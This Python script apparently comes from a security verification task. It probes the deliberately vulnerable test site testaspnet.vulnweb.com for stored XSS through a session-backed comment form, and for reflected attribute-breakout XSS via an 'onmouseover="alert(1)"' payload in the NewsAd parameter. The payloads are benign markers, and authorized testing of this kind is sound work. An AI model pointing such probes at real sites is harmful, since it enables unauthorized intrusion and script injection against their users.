#!/usr/bin/env python3
"""IV-13 Phase 4d: testaspnet refinement round 2.
(1) comment stored-XSS retry WITH proper cookie session (viewstate MAC needs session)
(2) ReadNews.aspx NewsAd attribute-breakout XSS probe (no angle brackets -> may pass
    ASP.NET request validation)
stdlib only."""
import json, os, re, time, ssl, urllib.request, urllib.parse, urllib.error, http.cookiejar
from html.parser import HTMLParser

B2 = 'http://testaspnet.vulnweb.com'
UA = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 IV13-IndependentVerifier/1.0'
CTX = ssl._create_unverified_context()
OUT = '/home/z/my-project/scripts/iv_out'
MARK = 'zxK1mQ7v'

class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None

class FormParser(HTMLParser):
    def __init__(self):
        super().__init__()
        self.forms = []
        self.cur = None
    def handle_starttag(self, tag, attrs):
        a = dict(attrs)
        if tag == 'form':
            self.cur = {'action': a.get('action'), 'method': (a.get('method') or 'GET').upper(), 'fields': []}
        elif self.cur is not None and tag in ('input', 'textarea', 'select', 'button'):
            self.cur['fields'].append({'tag': tag, 'type': a.get('type'), 'name': a.get('name'),
                                       'value': (a.get('value') or '')})
    def handle_endtag(self, tag):
        if tag == 'form' and self.cur:
            self.forms.append(self.cur)
            self.cur = None

def build():
    cj = http.cookiejar.CookieJar()
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj),
                                       urllib.request.HTTPSHandler(context=CTX), NoRedirect()), cj

def req(opener, url, data=None, timeout=25):
    hdrs = {'User-Agent': UA, 'Accept': 'text/html,*/*;q=0.8',
            'Referer': B2 + '/', 'Origin': 'http://testaspnet.vulnweb.com'}
    if data is not None:
        hdrs['Content-Type'] = 'application/x-www-form-urlencoded'
        data = urllib.parse.urlencode(data).encode()
    r = urllib.request.Request(url, data=data, headers=hdrs,
                               method='POST' if data is not None else 'GET')
    try:
        resp = opener.open(r, timeout=timeout)
        return resp.status, resp.read().decode('utf-8', 'replace')
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode('utf-8', 'replace')
    except Exception as e:
        return None, repr(e)

results = {}

print('--- (1) comment stored-XSS with session ---')
op, cj = build()
st, body = req(op, B2 + '/Comments.aspx?id=0')
print('GET Comments.aspx ->', st, len(body))
if st == 200:
    fp = FormParser()
    fp.feed(body)
    cf = None
    for f in fp.forms:
        if f['method'] == 'POST' and any(x.get('name') == 'tbComment' for x in f['fields']):
            cf = f
            break
    if cf:
        fields = {x['name']: (x.get('value') or '') for x in cf['fields'] if x.get('name')}
        btn = [x.get('value') or 'Send' for x in cf['fields'] if x.get('name') == 'btnSend']
        fields['btnSend'] = btn[0] if btn else 'Send'
        fields['tbComment'] = 'IV13 verification <u>%s</u>' % MARK
        action = cf['action'] or '/Comments.aspx?id=0'
        if not action.startswith('http'):
            action = B2 + '/' + action.lstrip('/')
        stp, pbody = req(op, action, data=fields)
        print('POST comment ->', stp, len(pbody))
        if stp == 500:
            m = re.search(r'(potentially dangerous|viewstate MAC|Validation of)[^<\n]{0,120}', pbody, re.I)
            print('  500 reason:', (m.group(0) if m else pbody[:180]).replace('\n', ' '))
        time.sleep(1.2)
        st1, rbody = req(op, B2 + '/Comments.aspx?id=0')
        raw = '<u>%s</u>' % MARK in rbody
        esc = '&lt;u&gt;%s&lt;/u&gt;' % MARK in rbody
        plain = MARK in rbody
        print('reload: status=%s len=%d raw-markup=%s escaped=%s plain=%s' % (st1, len(rbody), raw, esc, plain))
        i = rbody.find(MARK)
        if i >= 0:
            print('  ctx:', rbody[max(0, i - 80):i + 100].replace('\n', ' '))
        results['comment_xss_session'] = {'post_status': stp, 'reload_status': st1, 'len': len(rbody),
                                          'raw': raw, 'escaped': esc, 'plain': plain}
    else:
        print('comment form not found this time')

print()
print('--- (2) NewsAd attribute breakout ---')
for val, label in [('abcd" onmouseover="alert(1)" x="', 'attr-break'),
                   ('abcd%22%20onmouseover%3D%22alert(1)%22%20x%3D%22', 'attr-break-enc')]:
    q = urllib.parse.urlencode({'id': '0', 'NewsAd': val})
    st2, body2 = req(op, B2 + '/ReadNews.aspx?' + q)
    if isinstance(body2, str):
        i = body2.find('abcd')
        ctx = body2[max(0, i - 100):i + 140].replace('\n', ' ') if i >= 0 else ''
        raw_attr = 'onmouseover' in body2
        print('%-16s -> %s len=%d onmouseover-in-page=%s' % (label, st2, len(body2), raw_attr))
        if ctx:
            print('   ctx:', ctx[:220])
        results['newsad_' + label] = {'status': st2, 'len': len(body2),
                                      'onmouseover_reflected': raw_attr, 'context': ctx[:250]}
    time.sleep(0.5)

with open(os.path.join(OUT, 'aspnet2.json'), 'w') as f:
    json.dump(results, f, indent=1, ensure_ascii=False)
print('\nsaved -> scripts/iv_out/aspnet2.json')
